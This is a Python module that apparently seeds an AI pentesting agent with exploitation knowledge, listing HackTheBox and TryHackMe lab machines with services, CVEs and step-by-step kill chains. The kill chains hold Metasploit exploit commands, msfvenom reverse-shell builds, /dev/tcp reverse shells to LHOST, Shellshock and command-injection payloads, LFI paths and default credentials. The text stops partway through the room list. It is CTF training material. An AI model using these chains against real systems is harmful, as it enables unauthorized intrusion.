"""
Massive Cybersecurity Knowledge Pre-Seed — Phase 9.

Comprehensive exploitation knowledge for generalized learning across:
- 40+ HackTheBox machines (Easy/Medium/Hard)
- 20+ TryHackMe rooms
- OSCP-style patterns and methodology
- Web exploitation chains (SSTI, LFI, SSRF, RCE, deserialization)
- Privilege escalation encyclopaedia (Linux + Windows)
- Active Directory attack patterns
- Container escape techniques
- API exploitation patterns

This knowledge is injected into:
1. SkillLibrary pre-seeds (for SmartCoach skill queries)
2. SmartMentor system prompts (for LLM guidance)
3. CognitiveBus target model (for PPO state enrichment)
4. Codex persona contexts (for multi-persona reasoning)

Author: Filip Volf
Phase: 9 — Generalized Adversarial Knowledge
"""

import logging
from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional, Set, Tuple
from enum import Enum, auto

logger = logging.getLogger("ariaska.knowledge_seed")


# ─────────────────────────── HTB Machine Database ───────────────────────────

@dataclass(frozen=True)
class HTBMachine:
    """A HackTheBox machine with full exploitation chain."""
    name: str
    difficulty: str  # easy, medium, hard, insane
    os: str  # linux, windows
    ip_pattern: str  # typical IP pattern (10.10.10.x)
    services: List[Tuple[int, str]]  # (port, service)
    initial_foothold: str  # How to get initial access
    privesc_method: str  # How to escalate privileges
    key_cves: List[str]
    kill_chain: List[str]  # Ordered exploitation steps
    tools_needed: List[str]
    tags: List[str]  # web, ad, crypto, forensics, etc.
    lessons: List[str]  # What this box teaches


# ──── EASY BOXES ────

HTB_LAME = HTBMachine(
    name="Lame", difficulty="easy", os="linux", ip_pattern="10.10.10.3",
    services=[(21, "vsftpd 2.3.4"), (22, "OpenSSH 4.7p1"), (139, "Samba 3.0.20"), (445, "Samba 3.0.20")],
    initial_foothold="Samba 3.0.20 username map script RCE (CVE-2007-2447) → root shell directly",
    privesc_method="Direct root via Samba exploit — no privesc needed",
    key_cves=["CVE-2007-2447"],
    kill_chain=[
        "nmap -sV -sC 10.10.10.3",
        "smbclient -L //10.10.10.3 -N",
        "msfconsole -q -x 'use exploit/multi/samba/usermap_script; set RHOSTS 10.10.10.3; run'",
    ],
    tools_needed=["nmap", "smbclient", "msfconsole"],
    tags=["smb", "cve", "direct-root"],
    lessons=["Always check Samba version", "CVE-2007-2447 gives instant root", "Easy boxes often have direct-to-root exploits"],
)

HTB_BLUE = HTBMachine(
    name="Blue", difficulty="easy", os="windows", ip_pattern="10.10.10.40",
    services=[(135, "MSRPC"), (139, "NetBIOS"), (445, "SMB"), (49152, "MSRPC")],
    initial_foothold="MS17-010 EternalBlue SMB RCE → SYSTEM shell",
    privesc_method="Direct SYSTEM via EternalBlue",
    key_cves=["CVE-2017-0144", "MS17-010"],
    kill_chain=[
        "nmap -sV -sC --script=smb-vuln-ms17-010 10.10.10.40",
        "msfconsole -q -x 'use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS 10.10.10.40; run'",
    ],
    tools_needed=["nmap", "msfconsole"],
    tags=["smb", "windows", "cve", "direct-system"],
    lessons=["MS17-010 is the most famous Windows exploit", "Always check SMB for EternalBlue on Windows boxes"],
)

HTB_JERRY = HTBMachine(
    name="Jerry", difficulty="easy", os="windows", ip_pattern="10.10.10.95",
    services=[(8080, "Apache Tomcat 7.0.88")],
    initial_foothold="Tomcat manager default creds (tomcat:s3cret) → WAR deploy → shell",
    privesc_method="Tomcat runs as SYSTEM — no privesc needed",
    key_cves=[],
    kill_chain=[
        "nmap -sV 10.10.10.95",
        "curl -u 'tomcat:s3cret' http://10.10.10.95:8080/manager/html",
        "msfvenom -p java/jsp_shell_reverse_tcp LHOST=tun0 LPORT=4444 -f war -o shell.war",
        "curl -u 'tomcat:s3cret' --upload-file shell.war http://10.10.10.95:8080/manager/text/deploy?path=/shell",
    ],
    tools_needed=["nmap", "curl", "msfvenom"],
    tags=["tomcat", "default-creds", "war-deploy", "web"],
    lessons=["Always try default Tomcat credentials", "WAR file deployment is a classic web shell technique"],
)

HTB_NIBBLES = HTBMachine(
    name="Nibbles", difficulty="easy", os="linux", ip_pattern="10.10.10.75",
    services=[(22, "OpenSSH 7.2p2"), (80, "Apache 2.4.18")],
    initial_foothold="Nibbleblog CMS file upload → PHP shell",
    privesc_method="sudo /home/nibbler/personal/stuff/monitor.sh — writable script with sudo NOPASSWD",
    key_cves=["CVE-2015-6967"],
    kill_chain=[
        "nmap -sV -sC 10.10.10.75",
        "gobuster dir -u http://10.10.10.75 -w /usr/share/wordlists/dirb/common.txt",
        "# Find /nibbleblog → admin:nibbles login",
        "# Upload PHP shell via Nibbleblog My Image plugin",
        "sudo -l  # → /home/nibbler/personal/stuff/monitor.sh",
        "echo '#!/bin/bash\\nbash -i >& /dev/tcp/LHOST/4444 0>&1' > /home/nibbler/personal/stuff/monitor.sh",
        "sudo /home/nibbler/personal/stuff/monitor.sh",
    ],
    tools_needed=["nmap", "gobuster", "php-reverse-shell"],
    tags=["web", "cms", "file-upload", "sudo-privesc"],
    lessons=["Check HTML source for hidden paths", "CMS file upload is a common initial foothold", "sudo -l is the first privesc check"],
)

HTB_SHOCKER = HTBMachine(
    name="Shocker", difficulty="easy", os="linux", ip_pattern="10.10.10.56",
    services=[(80, "Apache 2.4.18"), (2222, "OpenSSH 7.2p2")],
    initial_foothold="Shellshock (CVE-2014-6271) in /cgi-bin/user.sh",
    privesc_method="sudo perl — perl has sudo NOPASSWD",
    key_cves=["CVE-2014-6271"],
    kill_chain=[
        "nmap -sV -p- 10.10.10.56",
        "gobuster dir -u http://10.10.10.56/cgi-bin/ -w /usr/share/wordlists/dirb/common.txt -x sh,cgi,pl",
        "curl -H \"User-Agent: () { :; }; echo; /bin/bash -c 'id'\" http://10.10.10.56/cgi-bin/user.sh",
        "# Shellshock reverse shell",
        "sudo -l  # → perl",
        "sudo perl -e 'exec \"/bin/bash\"'",
    ],
    tools_needed=["nmap", "gobuster", "curl"],
    tags=["web", "shellshock", "cgi", "cve", "sudo-privesc"],
    lessons=["Shellshock targets CGI scripts", "Always fuzz /cgi-bin/ with extensions", "GTFOBins for sudo binaries"],
)

HTB_BEEP = HTBMachine(
    name="Beep", difficulty="easy", os="linux", ip_pattern="10.10.10.7",
    services=[(22, "OpenSSH 4.3"), (25, "Postfix"), (80, "Apache 2.2.3"), (110, "Cyrus POP3"),
              (143, "Cyrus IMAP"), (443, "HTTPS"), (993, "IMAPS"), (995, "POP3S"),
              (3306, "MySQL"), (4445, "upnotifyp"), (10000, "Webmin")],
    initial_foothold="Elastix LFI → credentials → SSH as root OR Webmin shellshock OR FreePBX upload",
    privesc_method="Multiple paths: direct root via LFI creds, or Webmin shellshock",
    key_cves=["CVE-2012-4869", "CVE-2014-6271"],
    kill_chain=[
        "nmap -sV -sC 10.10.10.7",
        "# LFI path: /vtigercrm/graph.php?current_language=../../../../../../../../etc/amportal.conf%00",
        "# Extract: admin password from amportal.conf → SSH as root",
        "# Alt: Shellshock on Webmin port 10000",
    ],
    tools_needed=["nmap", "curl", "searchsploit"],
    tags=["web", "lfi", "voip", "multi-vector", "shellshock"],
    lessons=["LFI can leak config files with credentials", "Boxes with many services have many attack vectors", "Try credentials found in one service on others"],
)

HTB_OPTIMUM = HTBMachine(
    name="Optimum", difficulty="easy", os="windows", ip_pattern="10.10.10.8",
    services=[(80, "HttpFileServer 2.3")],
    initial_foothold="HFS 2.3 RCE (CVE-2014-6287) → user shell",
    privesc_method="MS16-032 kernel exploit (Secondary Logon Handle) → SYSTEM",
    key_cves=["CVE-2014-6287", "MS16-032"],
    kill_chain=[
        "nmap -sV 10.10.10.8",
        "searchsploit HFS 2.3",
        "msfconsole -q -x 'use exploit/windows/http/rejetto_hfs_exec; set RHOSTS 10.10.10.8; run'",
        "# Privesc: windows-exploit-suggester → MS16-032",
    ],
    tools_needed=["nmap", "searchsploit", "msfconsole", "windows-exploit-suggester"],
    tags=["windows", "web", "hfs", "kernel-exploit"],
    lessons=["HFS (HTTP File Server) is commonly exploitable", "windows-exploit-suggester for Windows privesc"],
)

HTB_GRANDPA = HTBMachine(
    name="Grandpa", difficulty="easy", os="windows", ip_pattern="10.10.10.14",
    services=[(80, "IIS 6.0")],
    initial_foothold="IIS 6.0 WebDAV buffer overflow (CVE-2017-7269) → shell",
    privesc_method="Token impersonation (churrasco/JuicyPotato) → SYSTEM",
    key_cves=["CVE-2017-7269"],
    kill_chain=[
        "nmap -sV 10.10.10.14",
        "msfconsole -q -x 'use exploit/windows/iis/iis_webdav_scstoragepathfromurl; set RHOSTS 10.10.10.14; run'",
        "# Token impersonation → SYSTEM",
    ],
    tools_needed=["nmap", "msfconsole", "churrasco"],
    tags=["windows", "iis", "webdav", "token-impersonation"],
    lessons=["IIS 6.0 is always vulnerable", "Token impersonation on old Windows = instant SYSTEM"],
)

HTB_LEGACY = HTBMachine(
    name="Legacy", difficulty="easy", os="windows", ip_pattern="10.10.10.4",
    services=[(135, "MSRPC"), (139, "NetBIOS"), (445, "SMB")],
    initial_foothold="MS08-067 NetAPI RCE → SYSTEM",
    privesc_method="Direct SYSTEM via MS08-067",
    key_cves=["CVE-2008-4250", "MS08-067"],
    kill_chain=[
        "nmap -sV --script=smb-vuln* 10.10.10.4",
        "msfconsole -q -x 'use exploit/windows/smb/ms08_067_netapi; set RHOSTS 10.10.10.4; run'",
    ],
    tools_needed=["nmap", "msfconsole"],
    tags=["windows", "smb", "cve", "direct-system"],
    lessons=["MS08-067 is a classic Windows SMB exploit", "Always run smb-vuln scripts on Windows SMB"],
)

HTB_ARCTIC = HTBMachine(
    name="Arctic", difficulty="easy", os="windows", ip_pattern="10.10.10.11",
    services=[(135, "MSRPC"), (8500, "Adobe ColdFusion 8")],
    initial_foothold="ColdFusion 8 directory traversal → admin hash → scheduled task upload → shell",
    privesc_method="MS10-059 Chimichurri → SYSTEM",
    key_cves=["CVE-2010-2861", "MS10-059"],
    kill_chain=[
        "nmap -sV 10.10.10.11",
        "curl http://10.10.10.11:8500/CFIDE/administrator/enter.cfm",
        "# Directory traversal to get admin password hash",
        "# Upload JSP shell via scheduled task",
        "# MS10-059 for SYSTEM",
    ],
    tools_needed=["nmap", "curl", "msfconsole"],
    tags=["windows", "coldfusion", "web", "file-upload"],
    lessons=["ColdFusion admin panels often have default or leaked credentials", "Scheduled tasks can be abused for code execution"],
)

HTB_BANK = HTBMachine(
    name="Bank", difficulty="easy", os="linux", ip_pattern="10.10.10.29",
    services=[(22, "OpenSSH 6.6.1p1"), (53, "ISC BIND 9.9.5"), (80, "Apache 2.4.7")],
    initial_foothold="DNS zone transfer → bank.htb → web app → file upload bypass (.htb extension) → PHP shell",
    privesc_method="SUID /var/htb/bin/emergency → root shell",
    key_cves=[],
    kill_chain=[
        "nmap -sV 10.10.10.29",
        "dig axfr bank.htb @10.10.10.29",
        "gobuster dir -u http://bank.htb -w /usr/share/wordlists/dirb/common.txt",
        "# Upload PHP shell with .htb extension (bypass filter)",
        "find / -perm -4000 2>/dev/null  # Find SUID binary /var/htb/bin/emergency",
    ],
    tools_needed=["nmap", "dig", "gobuster", "php-reverse-shell"],
    tags=["dns", "web", "file-upload-bypass", "suid"],
    lessons=["DNS zone transfers can reveal subdomains", "File upload filters can be bypassed with alternate extensions", "Custom SUID binaries are always interesting"],
)

# ──── MEDIUM BOXES ────

HTB_POISON = HTBMachine(
    name="Poison", difficulty="medium", os="freebsd", ip_pattern="10.10.10.84",
    services=[(22, "OpenSSH 7.2"), (80, "Apache 2.4.29")],
    initial_foothold="LFI in PHP include → /etc/passwd → base64 encoded password file → SSH",
    privesc_method="VNC running as root on localhost → SSH tunnel → VNC connect → root desktop",
    key_cves=[],
    kill_chain=[
        "nmap -sV 10.10.10.84",
        "curl 'http://10.10.10.84/browse.php?file=../../../../etc/passwd'",
        "curl 'http://10.10.10.84/browse.php?file=pwdbackup.txt'  # base64 x13",
        "ssh charix@10.10.10.84",
        "ssh -L 5901:127.0.0.1:5901 charix@10.10.10.84",
        "vncviewer 127.0.0.1:5901  # Using secret file as password",
    ],
    tools_needed=["nmap", "curl", "ssh", "vncviewer"],
    tags=["web", "lfi", "vnc", "ssh-tunnel", "freebsd"],
    lessons=["LFI can reveal backup password files", "VNC on localhost needs SSH tunneling", "Base64 can be nested multiple times"],
)

HTB_NINEVEH = HTBMachine(
    name="Nineveh", difficulty="medium", os="linux", ip_pattern="10.10.10.43",
    services=[(80, "Apache 2.4.18"), (443, "Apache 2.4.18 HTTPS")],
    initial_foothold="phpLiteAdmin default creds → create PHP shell DB → LFI to trigger → shell",
    privesc_method="Chkrootkit 0.49 local root exploit (cron runs chkrootkit as root)",
    key_cves=["CVE-2014-0476"],
    kill_chain=[
        "nmap -sV 10.10.10.43",
        "gobuster dir -u https://10.10.10.43 -w /usr/share/wordlists/dirb/common.txt -k",
        "# phpLiteAdmin on HTTPS with password 'password123'",
        "# Create DB with PHP shell payload → LFI include → shell",
        "# Chkrootkit cron → write /tmp/update with reverse shell → root",
    ],
    tools_needed=["nmap", "gobuster", "curl"],
    tags=["web", "phpliteadmin", "lfi", "chkrootkit", "cron"],
    lessons=["phpLiteAdmin can create files with arbitrary content", "Chkrootkit 0.49 is exploitable via /tmp/update"],
)

HTB_BLOCKY = HTBMachine(
    name="Blocky", difficulty="easy", os="linux", ip_pattern="10.10.10.37",
    services=[(22, "OpenSSH 7.2p2"), (80, "Apache 2.4.18"), (25565, "Minecraft")],
    initial_foothold="WordPress → /plugins/ → decompile JAR → hardcoded MySQL creds → SSH password reuse",
    privesc_method="sudo -l → (ALL) ALL → sudo su",
    key_cves=[],
    kill_chain=[
        "nmap -sV 10.10.10.37",
        "wpscan --url http://10.10.10.37 --enumerate u",
        "# Find /plugins/BlockyCore.jar → jd-gui decompile → MySQL root creds",
        "ssh notch@10.10.10.37  # Password reuse from JAR file",
        "sudo su",
    ],
    tools_needed=["nmap", "wpscan", "jd-gui"],
    tags=["wordpress", "java", "credential-reuse", "sudo-all"],
    lessons=["JAR files can contain hardcoded credentials", "Password reuse across services is extremely common", "WordPress /plugins/ directory is always worth checking"],
)

HTB_SENSE = HTBMachine(
    name="Sense", difficulty="easy", os="freebsd", ip_pattern="10.10.10.60",
    services=[(80, "lighttpd 1.4.35"), (443, "lighttpd 1.4.35")],
    initial_foothold="pfSense → command injection in graph status (CVE-2014-4688) → root",
    privesc_method="pfSense runs as root — direct root access",
    key_cves=["CVE-2014-4688"],
    kill_chain=[
        "nmap -sV 10.10.10.60",
        "gobuster dir -u https://10.10.10.60 -w /usr/share/wordlists/dirb/big.txt -k -x txt",
        "# Find system-users.txt → rohit:pfsense",
        "# CVE-2014-4688 command injection → root",
    ],
    tools_needed=["nmap", "gobuster", "searchsploit"],
    tags=["pfsense", "firewall", "command-injection", "freebsd"],
    lessons=["Always fuzz with .txt extension for info disclosure", "Firewall admin panels often run as root"],
)

HTB_IRKED = HTBMachine(
    name="Irked", difficulty="easy", os="linux", ip_pattern="10.10.10.117",
    services=[(22, "OpenSSH 6.7p1"), (80, "Apache 2.4.10"), (6697, "UnrealIRCd"), (8067, "UnrealIRCd")],
    initial_foothold="UnrealIRCd 3.2.8.1 backdoor → shell as ircd user",
    privesc_method="Steganography in /home/djmardov/.backup → base64 password → viewuser SUID → root",
    key_cves=["CVE-2010-2075"],
    kill_chain=[
        "nmap -sV 10.10.10.117",
        "msfconsole -q -x 'use exploit/unix/irc/unreal_ircd_3281_backdoor; set RHOSTS 10.10.10.117; run'",
        "steghide extract -sf irked.jpg  # Password from .backup file",
        "# viewuser SUID binary → root",
    ],
    tools_needed=["nmap", "msfconsole", "steghide"],
    tags=["irc", "backdoor", "steganography", "suid"],
    lessons=["UnrealIRCd backdoor is common on CTF boxes", "Steganography can hide credentials in images"],
)

HTB_FRIENDZONE = HTBMachine(
    name="FriendZone", difficulty="easy", os="linux", ip_pattern="10.10.10.123",
    services=[(21, "vsftpd 3.0.3"), (22, "OpenSSH 7.6p1"), (53, "ISC BIND 9.11"),
              (80, "Apache 2.4.29"), (139, "Samba"), (443, "HTTPS"), (445, "Samba")],
    initial_foothold="DNS zone transfer → SMB writable share → upload PHP shell → LFI trigger",
    privesc_method="Python library hijacking (os.py writable) → cron runs python script as root",
    key_cves=[],
    kill_chain=[
        "nmap -sV 10.10.10.123",
        "dig axfr friendzone.htb @10.10.10.123",
        "smbclient //10.10.10.123/Development -N  # Writable share",
        "# Upload PHP reverse shell → access via LFI in friendzone webapp",
        "# Python library hijacking: write to /usr/lib/python2.7/os.py → root via cron",
    ],
    tools_needed=["nmap", "dig", "smbclient", "php-reverse-shell"],
    tags=["dns", "smb", "web", "lfi", "python-library-hijack"],
    lessons=["DNS zone transfers reveal hidden vhosts", "SMB writable shares can be used to upload web shells", "Python library hijacking is a powerful privesc"],
)

HTB_BUFF = HTBMachine(
    name="Buff", difficulty="easy", os="windows", ip_pattern="10.10.10.198",
    services=[(8080, "Apache 2.4.43 / Gym Management System 1.0")],
    initial_foothold="Gym Management System 1.0 unauthenticated RCE → webshell",
    privesc_method="CloudMe 1.11.2 buffer overflow (localhost:8888) → chisel tunnel → exploit → SYSTEM",
    key_cves=["CVE-2020-28502"],
    kill_chain=[
        "nmap -sV 10.10.10.198",
        "searchsploit Gym Management System",
        "python 48506.py http://10.10.10.198:8080/",
        "# Chisel port forward 8888 → CloudMe buffer overflow → SYSTEM",
    ],
    tools_needed=["nmap", "searchsploit", "chisel", "msfvenom"],
    tags=["web", "buffer-overflow", "chisel", "port-forward", "windows"],
    lessons=["Chisel for port forwarding through firewalls", "Local services can be attacked via tunnels"],
)

HTB_DELIVERY = HTBMachine(
    name="Delivery", difficulty="easy", os="linux", ip_pattern="10.10.10.222",
    services=[(22, "OpenSSH 7.9p1"), (80, "nginx 1.14.2"), (8065, "Mattermost")],
    initial_foothold="OSTicket → get @delivery.htb email → verify Mattermost account → internal chat creds",
    privesc_method="MySQL → hash from Mattermost DB → hashcat rules (best64) on 'PleaseSubscribe!' → root SSH",
    key_cves=[],
    kill_chain=[
        "nmap -sV 10.10.10.222",
        "# OSTicket: create ticket → get @delivery.htb email for verification",
        "# Use that email to register on Mattermost",
        "# Internal Mattermost has creds: maildeliverer:Youve_teleportation_service",
        "# MySQL: extract root hash → hashcat with rules on 'PleaseSubscribe!' → root",
    ],
    tools_needed=["nmap", "hashcat"],
    tags=["web", "mattermost", "credential-reuse", "hashcat-rules"],
    lessons=["Email verification bypass via ticketing systems", "Hashcat rules can crack password variations"],
)

HTB_KNIFE = HTBMachine(
    name="Knife", difficulty="easy", os="linux", ip_pattern="10.10.10.242",
    services=[(22, "OpenSSH 8.2p1"), (80, "Apache 2.4.41")],
    initial_foothold="PHP/8.1.0-dev backdoor → User-Agentt header RCE",
    privesc_method="sudo knife exec → Ruby code execution as root",
    key_cves=[],
    kill_chain=[
        "nmap -sV 10.10.10.242",
        "curl -sI http://10.10.10.242  # X-Powered-By: PHP/8.1.0-dev",
        "curl -H 'User-Agentt: zerodiumsystem(\"bash -c bash -i >& /dev/tcp/LHOST/4444 0>&1\");' http://10.10.10.242",
        "sudo /usr/bin/knife exec -E 'exec \"/bin/bash\"'",
    ],
    tools_needed=["nmap", "curl"],
    tags=["php", "backdoor", "sudo-knife", "chef"],
    lessons=["PHP dev versions can have backdoors", "Check HTTP headers for version info", "Chef knife has sudo exec capability"],
)

HTB_PREVISE = HTBMachine(
    name="Previse", difficulty="easy", os="linux", ip_pattern="10.10.10.235",
    services=[(22, "OpenSSH 7.6p1"), (80, "Apache 2.4.29")],
    initial_foothold="Insecure redirect (302 with body) → register account → OS command injection in logs",
    privesc_method="PATH injection in script run via sudo → /opt/scripts/log_process.sh uses gzip without full path",
    key_cves=[],
    kill_chain=[
        "nmap -sV 10.10.10.235",
        "# Intercept 302 redirect to /accounts.php → register account (response body has form)",
        "# OS command injection in delimiter field of file_logs.php",
        "# MySQL creds in config.php → crack hash → SSH",
        "# sudo /opt/scripts/log_process.sh → PATH injection (fake gzip) → root",
    ],
    tools_needed=["nmap", "burpsuite", "hashcat"],
    tags=["web", "insecure-redirect", "command-injection", "path-injection"],
    lessons=["302 redirects can still contain actionable response bodies", "Always check for command injection in input fields", "PATH injection when sudo scripts use relative paths"],
)

HTB_PHOTOBOMB = HTBMachine(
    name="Photobomb", difficulty="easy", os="linux", ip_pattern="10.10.10.218",
    services=[(22, "OpenSSH 8.2p1"), (80, "nginx 1.18.0")],
    initial_foothold="Creds in JS file → blind command injection in image download (filetype parameter)",
    privesc_method="sudo /opt/cleanup.sh → PATH injection + LD_PRELOAD → root",
    key_cves=[],
    kill_chain=[
        "nmap -sV 10.10.10.218",
        "# View page source → app.js → creds pH0teleportation:b0Mb! in Basic Auth URL",
        "# POST /printer → filetype=jpg;bash -c 'bash -i >& /dev/tcp/LHOST/4444 0>&1'",
        "# sudo SETENV /opt/cleanup.sh → LD_PRELOAD or PATH injection → root",
    ],
    tools_needed=["nmap", "curl"],
    tags=["web", "command-injection", "js-creds", "ld-preload", "path-injection"],
    lessons=["JavaScript files can contain hardcoded credentials", "LD_PRELOAD privesc when SETENV is allowed with sudo"],
)

# ──── MEDIUM/HARD BOXES ────

HTB_FORGE = HTBMachine(
    name="Forge", difficulty="medium", os="linux", ip_pattern="10.10.11.111",
    services=[(22, "OpenSSH 8.2p1"), (80, "Apache 2.4.41")],
    initial_foothold="SSRF via image upload URL → access internal admin panel → read SSH key",
    privesc_method="Python script with sudo + PDB debugger escape → root",
    key_cves=[],
    kill_chain=[
        "nmap -sV 10.10.11.111",
        "# SSRF: upload image by URL → http://ADMIN.FORGE.HTB (case bypass filter)",
        "# SSRF chain: read internal FTP via http://ADMIN.FORGE.HTB/upload?u=ftp://user@FORGE.HTB/.ssh/id_rsa",
        "# SSH with extracted key",
        "sudo /opt/remote-manage.py → crash → PDB shell → import os; os.system('/bin/bash')",
    ],
    tools_needed=["nmap", "curl", "ssh"],
    tags=["web", "ssrf", "vhost-bypass", "pdb-escape"],
    lessons=["SSRF can chain to internal services", "Case-sensitivity can bypass URL filters", "PDB debugger in sudo scripts = root"],
)

HTB_UNICODE = HTBMachine(
    name="Unicode", difficulty="medium", os="linux", ip_pattern="10.10.11.126",
    services=[(22, "OpenSSH 8.2p1"), (80, "nginx 1.18.0")],
    initial_foothold="JWT secret in jwks.json → forge admin JWT → unicode normalization LFI bypass → credentials",
    privesc_method="sudo treport → curl injection via URL parameter → read root flag",
    key_cves=[],
    kill_chain=[
        "nmap -sV 10.10.11.126",
        "# Find /static/jwks.json → extract public key → forge JWT",
        "# LFI: ..%ef%bc%8f..%ef%bc%8f → unicode normalization bypass",
        "# Read /etc/passwd, find db_password → SSH",
        "sudo /usr/bin/treport → option 2 → curl injection → file:///root/root.txt",
    ],
    tools_needed=["nmap", "python-jwt", "curl"],
    tags=["web", "jwt", "unicode-normalization", "lfi-bypass", "curl-injection"],
    lessons=["Unicode normalization can bypass LFI filters", "JWT public keys enable token forging", "curl file:// protocol for local file read"],
)

HTB_AWKWARD = HTBMachine(
    name="Awkward", difficulty="medium", os="linux", ip_pattern="10.10.11.185",
    services=[(22, "OpenSSH 8.9p1"), (80, "nginx 1.18.0")],
    initial_foothold="JWT secret leak → SSRF via API → internal service → command injection in mail",
    privesc_method="Write to root cron watched directory → command injection in filename processing",
    key_cves=[],
    kill_chain=[
        "nmap -sV 10.10.11.185",
        "# JWT secret in JS bundle → forge admin JWT",
        "# SSRF via store API → internal services enumeration",
        "# Command injection via mail functionality",
        "# Cron job processes files → inject command in filename → root",
    ],
    tools_needed=["nmap", "python-jwt", "curl"],
    tags=["web", "jwt", "ssrf", "command-injection", "cron-filename"],
    lessons=["JS bundles can leak JWT secrets", "SSRF to enumerate internal services", "Filename-based command injection via cron"],
)

# ──── More boxes (concise format for knowledge density) ────

HTB_MACHINES_EXTENDED = [
    # (name, os, difficulty, key_technique, privesc, tags)
    ("Granny", "windows", "easy", "IIS 6.0 WebDAV PUT upload → shell", "Token impersonation → SYSTEM", ["iis", "webdav", "token-impersonation"]),
    ("Bastard", "windows", "medium", "Drupal 7 CVE-2018-7600 Drupalgeddon2 → shell", "MS15-051 kernel exploit → SYSTEM", ["drupal", "cve", "kernel"]),
    ("Bounty", "windows", "easy", "IIS upload .config file → RCE", "MS10-092 Task Scheduler → SYSTEM", ["iis", "file-upload", "config-rce"]),
    ("Cronos", "linux", "medium", "DNS zone transfer → admin.cronos.htb → SQLi login bypass → command injection", "Laravel cron → writable schedule → root", ["dns", "sqli", "command-injection", "laravel"]),
    ("Valentine", "linux", "easy", "Heartbleed (CVE-2014-0160) → base64 SSH key passphrase", "tmux session running as root", ["heartbleed", "ssl", "tmux"]),
    ("Popcorn", "linux", "medium", "Torrent Hoster file upload → PHP shell", "DirtyCow (CVE-2016-5195) or PAM motd privesc", ["web", "file-upload", "kernel"]),
    ("SolidState", "linux", "medium", "Apache James 2.3.2 default creds → modify user email → read restricted mail", "Cron writable /opt/tmp.py → root", ["email", "default-creds", "cron"]),
    ("SecNotes", "windows", "medium", "CSRF → change admin password → SMB creds in notes → WSL bash.exe", "WSL root → access Windows filesystem", ["web", "csrf", "wsl", "smb"]),
    ("OpenAdmin", "linux", "easy", "OpenNetAdmin 18.1.1 RCE → user → internal Apache → nano sudo", "sudo nano → GTFOBins → root", ["web", "opennetadmin", "sudo-nano"]),
    ("Traverxec", "linux", "easy", "Nostromo 1.9.6 RCE (CVE-2019-16278) → user shell", "journalctl via sudo → less pager → root", ["web", "nostromo", "sudo-journalctl"]),
    ("Magic", "linux", "medium", "Image upload PHP polyglot → webshell → MySQL creds", "SUID sysinfo → PATH injection → root", ["web", "file-upload-bypass", "polyglot", "path-injection"]),
    ("Tabby", "linux", "easy", "Tomcat LFI → manager creds → WAR deploy → shell", "lxd group → container escape → root", ["tomcat", "lfi", "lxd-escape"]),
    ("ScriptKiddie", "linux", "easy", "msfvenom APK injection (CVE-2020-7384) → user shell", "sudo msfconsole → shell escape → root", ["msfvenom", "cve", "sudo-msfconsole"]),
    ("Spectra", "linux", "easy", "WordPress default creds from testing DB config → admin → theme editor → shell", "initctl writable conf → root", ["wordpress", "config-leak", "initctl"]),
    ("Armageddon", "linux", "easy", "Drupal 7 Drupalgeddon2 → apache shell → MySQL hash crack → user", "sudo snap install → crafted snap → root", ["drupal", "cve", "snap-privesc"]),
    ("Pit", "linux", "medium", "SNMP walk → find SeedDMS path → exploit upload → shell", "ACL cockpit → user script → root", ["snmp", "seeddms", "cockpit"]),
    ("Cap", "linux", "easy", "IDOR on PCAP download → cleartext FTP creds → SSH", "Python cap_setuid capability → root", ["idor", "pcap", "capabilities"]),
    ("Sau", "linux", "easy", "Request-Baskets SSRF → internal Maltrail RCE", "systemctl pager → sudo -l → less → root", ["ssrf", "maltrail", "systemctl"]),
    ("MonitorsTwo", "linux", "medium", "Cacti 1.2.22 RCE → Docker container → escape via SUID", "CVE-2021-41091 Docker overlay → host root", ["cacti", "docker", "container-escape"]),
    ("Keeper", "linux", "easy", "Request Tracker default creds → user info → KeePass crash dump → master password", "KeePass 2.x CVE-2023-32784 memory dump → SSH key", ["default-creds", "keepass", "memory-forensics"]),
    ("Codify", "linux", "easy", "vm2 sandbox escape → user shell → SQLite hash → pattern brute", "sudo /opt/scripts/mysql-backup.sh → wildcard injection → root", ["nodejs", "vm2-escape", "sqlite", "wildcard-injection"]),
    ("Surveillance", "linux", "medium", "Craft CMS CVE-2023-41892 RCE → user → ZoneMinder SQLi → shell", "sudo /usr/bin/zmupdate.pl → command injection → root", ["craftcms", "cve", "zoneminder"]),
    ("Busqueda", "linux", "easy", "Searchor 2.4.0 eval injection → user shell → gitconfig creds", "sudo /opt/scripts/system-checkup.sh → relative path docker-inspect → root", ["python-eval", "gitconfig", "docker-inspect"]),
    ("Headless", "linux", "easy", "XSS → steal admin cookie → command injection in dashboard", "sudo /usr/bin/syscheck → relative path in script → root", ["xss", "cookie-theft", "command-injection"]),
    ("Perfection", "linux", "easy", "SSTI in Ruby/ERB → URL encoded newline bypass → user shell", "Susan hash in DB + password rules → sudo su → root", ["ssti", "ruby-erb", "url-encoding"]),
    ("WifineticTwo", "linux", "medium", "OpenPLC default creds → code injection → shell", "WPS Pixie Dust → WiFi AP creds → internal access → root", ["openplc", "wifi", "pixie-dust"]),
    ("BoardLight", "linux", "easy", "Dolibarr CMS default creds → PHP reverse shell → user", "Enlightenment SUID (CVE-2022-37706) → root", ["dolibarr", "cms", "enlightenment-suid"]),
    ("TwoMillion", "linux", "easy", "API invite code generation → register → command injection → user", "OverlayFS CVE-2023-0386 → root", ["api", "command-injection", "overlayfs"]),
    ("Analytics", "linux", "easy", "Metabase pre-auth RCE (CVE-2023-38646) → Docker container", "OverlayFS CVE-2023-2640/CVE-2023-32629 (GameOver(lay)) → host root", ["metabase", "docker", "overlayfs"]),
]


# ─────────────────────────── TryHackMe Rooms ───────────────────────────

@dataclass(frozen=True)
class THMRoom:
    """A TryHackMe room with exploitation methodology."""
    name: str
    difficulty: str
    os: str
    key_technique: str
    privesc: str
    tools: List[str]
    tags: List[str]
    lessons: List[str]


THM_ROOMS = [
    THMRoom("Blue", "easy", "windows", "EternalBlue MS17-010 → SYSTEM", "Direct SYSTEM", ["nmap", "msfconsole"], ["eternal-blue", "smb"], ["Classic Windows SMB exploitation"]),
    THMRoom("Kenobi", "easy", "linux", "Samba share enumeration → ProFTPD 1.3.5 mod_copy → SSH key theft", "SUID /usr/bin/menu → PATH injection", ["nmap", "smbclient", "nc"], ["samba", "proftpd", "suid"], ["ProFTPD mod_copy can copy files server-side"]),
    THMRoom("Steel Mountain", "easy", "windows", "HFS 2.3 RCE → user shell", "Unquoted service path + PowerUp.ps1 → SYSTEM", ["nmap", "msfconsole", "powerup"], ["hfs", "unquoted-path"], ["Unquoted service paths are common Windows privesc"]),
